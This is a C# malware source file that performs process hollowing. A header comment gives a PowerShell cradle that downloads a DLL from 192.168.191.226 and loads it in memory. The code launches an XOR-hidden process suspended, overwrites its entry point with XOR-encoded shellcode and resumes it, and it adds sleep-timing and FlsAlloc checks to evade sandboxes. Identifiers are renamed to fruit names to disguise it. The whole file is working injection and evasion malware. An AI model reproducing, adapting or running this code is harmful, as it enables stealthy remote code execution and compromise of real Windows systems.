/* process hollowing obfucated and encryptes */
/* compile it in dll, e then use this cradle
*
* $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.191.226/ClassLibrary6.dll')
* $assem = [System.Reflection.Assembly]::Load($data)
* $class = $assem.GetType("apple.milk")
* $method = $class.GetMethod("pear")
* $method.Invoke(0, $null)
 */
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace apple
{
    class milk
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        };

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        };

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          Int32 nSize,
          out IntPtr lpNumberOfBytesWritten);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        public static void pear()
        {

            string apple(byte[] input)
            {
                byte[] buff = new byte[input.Length];
                for (int i = 0; i < input.Length; i++) { buff[i] = (byte)(input[i] ^ 0x5c); };
                return Encoding.ASCII.GetString(buff);
            }

            byte[] a = new byte[31] {
0x1f, 0x66, 0x00, 0x0b, 0x35, 0x32, 0x38, 0x33, 0x2b, 0x2f, 0x00, 0x0f, 0x25,
0x2f, 0x28, 0x39, 0x31, 0x6f, 0x6e, 0x00, 0x2f, 0x2a, 0x3f, 0x34, 0x33,
0x2f, 0x28, 0x72, 0x39, 0x24, 0x39, };

            IntPtr x = FlsAlloc(IntPtr.Zero);
            
            if ((uint)x == 0xFFFFFFFF) { return; }
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) { return; }
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, apple(a), IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);


            /* Write shell code into exe */

byte[] buf = new byte[593] {
0xd6, 0x62, 0xa9, 0xce, 0xda, 0xc2, 0xe6, 0x2a, 0x2a, 0x2a, 0x6b, 0x7b, 0x6b,
0x7a, 0x78, 0x62, 0x1b, 0xf8, 0x7b, 0x7c, 0x4f, 0x62, 0xa1, 0x78, 0x4a,
0x62, 0xa1, 0x78, 0x32, 0x62, 0xa1, 0x78, 0x0a, 0x67, 0x1b, 0xe3, 0x62,
0xa1, 0x58, 0x7a, 0x62, 0x25, 0x9d, 0x60, 0x60, 0x62, 0x1b, 0xea, 0x86,
0x16, 0x4b, 0x56, 0x28, 0x06, 0x0a, 0x6b, 0xeb, 0xe3, 0x27, 0x6b, 0x2b,
0xeb, 0xc8, 0xc7, 0x78, 0x62, 0xa1, 0x78, 0x0a, 0x6b, 0x7b, 0xa1, 0x68,
0x16, 0x62, 0x2b, 0xfa, 0x4c, 0xab, 0x52, 0x32, 0x21, 0x28, 0x25, 0xaf,
0x58, 0x2a, 0x2a, 0x2a, 0xa1, 0xaa, 0xa2, 0x2a, 0x2a, 0x2a, 0x62, 0xaf,
0xea, 0x5e, 0x4d, 0x62, 0x2b, 0xfa, 0x6e, 0xa1, 0x6a, 0x0a, 0x7a, 0x63,
0x2b, 0xfa, 0xa1, 0x62, 0x32, 0xc9, 0x7c, 0x62, 0xd5, 0xe3, 0x67, 0x1b,
0xe3, 0x6b, 0xa1, 0x1e, 0xa2, 0x62, 0x2b, 0xfc, 0x62, 0x1b, 0xea, 0x6b,
0xeb, 0xe3, 0x27, 0x86, 0x6b, 0x2b, 0xeb, 0x12, 0xca, 0x5f, 0xdb, 0x66,
0x29, 0x66, 0x0e, 0x22, 0x6f, 0x13, 0xfb, 0x5f, 0xf2, 0x72, 0x6e, 0xa1,
0x6a, 0x0e, 0x63, 0x2b, 0xfa, 0x4c, 0x6b, 0xa1, 0x26, 0x62, 0x6e, 0xa1,
0x6a, 0x36, 0x63, 0x2b, 0xfa, 0x6b, 0xa1, 0x2e, 0xa2, 0x6b, 0x72, 0x62,
0x2b, 0xfa, 0x6b, 0x72, 0x74, 0x73, 0x70, 0x6b, 0x72, 0x6b, 0x73, 0x6b,
0x70, 0x62, 0xa9, 0xc6, 0x0a, 0x6b, 0x78, 0xd5, 0xca, 0x72, 0x6b, 0x73,
0x70, 0x62, 0xa1, 0x38, 0xc3, 0x61, 0xd5, 0xd5, 0xd5, 0x77, 0x62, 0x1b,
0xf1, 0x79, 0x63, 0x94, 0x5d, 0x43, 0x44, 0x43, 0x44, 0x4f, 0x5e, 0x2a,
0x6b, 0x7c, 0x62, 0xa3, 0xcb, 0x63, 0xed, 0xe8, 0x66, 0x5d, 0x0c, 0x2d,
0xd5, 0xff, 0x79, 0x79, 0x62, 0xa3, 0xcb, 0x79, 0x70, 0x67, 0x1b, 0xea,
0x67, 0x1b, 0xe3, 0x79, 0x79, 0x63, 0x90, 0x10, 0x7c, 0x53, 0x8d, 0x2a,
0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0xc2, 0x3a, 0x2a, 0x2a, 0x2a, 0x1b, 0x13,
0x18, 0x04, 0x1b, 0x1c, 0x12, 0x04, 0x1b, 0x13, 0x1b, 0x04, 0x18, 0x18,
0x1c, 0x2a, 0x70, 0x62, 0xa3, 0xeb, 0x63, 0xed, 0xea, 0x91, 0x2b, 0x2a,
0x2a, 0x67, 0x1b, 0xe3, 0x79, 0x79, 0x40, 0x29, 0x79, 0x63, 0x90, 0x7d,
0xa3, 0xb5, 0xec, 0x2a, 0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0xc2, 0x0c, 0x2a,
0x2a, 0x2a, 0x05, 0x4d, 0x18, 0x6b, 0x40, 0x48, 0x07, 0x7a, 0x07, 0x59,
0x4f, 0x65, 0x49, 0x46, 0x70, 0x18, 0x72, 0x07, 0x12, 0x66, 0x7d, 0x6e,
0x4d, 0x47, 0x6b, 0x65, 0x5d, 0x1e, 0x13, 0x4d, 0x1a, 0x75, 0x5c, 0x1d,
0x69, 0x66, 0x46, 0x2a, 0x62, 0xa3, 0xeb, 0x79, 0x70, 0x6b, 0x72, 0x67,
0x1b, 0xe3, 0x79, 0x62, 0x92, 0x2a, 0x18, 0x82, 0xae, 0x2a, 0x2a, 0x2a,
0x2a, 0x7a, 0x79, 0x79, 0x63, 0xed, 0xe8, 0xc1, 0x7f, 0x04, 0x11, 0xd5,
0xff, 0x62, 0xa3, 0xec, 0x40, 0x20, 0x75, 0x62, 0xa3, 0xdb, 0x40, 0x35,
0x70, 0x78, 0x42, 0xaa, 0x19, 0x2a, 0x2a, 0x63, 0xa3, 0xca, 0x40, 0x2e,
0x6b, 0x73, 0x63, 0x90, 0x5f, 0x6c, 0xb4, 0xac, 0x2a, 0x2a, 0x2a, 0x2a,
0xd5, 0xff, 0x67, 0x1b, 0xea, 0x79, 0x70, 0x62, 0xa3, 0xdb, 0x67, 0x1b,
0xe3, 0x67, 0x1b, 0xe3, 0x79, 0x79, 0x63, 0xed, 0xe8, 0x07, 0x2c, 0x32,
0x51, 0xd5, 0xff, 0xaf, 0xea, 0x5f, 0x35, 0x62, 0xed, 0xeb, 0xa2, 0x39,
0x2a, 0x2a, 0x63, 0x90, 0x6e, 0xda, 0x1f, 0xca, 0x2a, 0x2a, 0x2a, 0x2a,
0xd5, 0xff, 0x62, 0xd5, 0xe5, 0x5e, 0x28, 0xc1, 0x80, 0xc2, 0x7f, 0x2a,
0x2a, 0x2a, 0x79, 0x73, 0x40, 0x6a, 0x70, 0x63, 0xa3, 0xfb, 0xeb, 0xc8,
0x3a, 0x63, 0xed, 0xea, 0x2a, 0x3a, 0x2a, 0x2a, 0x63, 0x90, 0x72, 0x8e,
0x79, 0xcf, 0x2a, 0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0x62, 0xb9, 0x79, 0x79,
0x62, 0xa3, 0xcd, 0x62, 0xa3, 0xdb, 0x62, 0xa3, 0xf0, 0x63, 0xed, 0xea,
0x2a, 0x0a, 0x2a, 0x2a, 0x63, 0xa3, 0xd3, 0x63, 0x90, 0x38, 0xbc, 0xa3,
0xc8, 0x2a, 0x2a, 0x2a, 0x2a, 0xd5, 0xff, 0x62, 0xa9, 0xee, 0x0a, 0xaf,
0xea, 0x5e, 0x98, 0x4c, 0xa1, 0x2d, 0x62, 0x2b, 0xe9, 0xaf, 0xea, 0x5f,
0xf8, 0x72, 0xe9, 0x72, 0x40, 0x2a, 0x73, 0x63, 0xed, 0xe8, 0xda, 0x9f,
0x88, 0x7c, 0xd5, 0xff, };

            for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ 0x2a); }
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);

        }
    }
}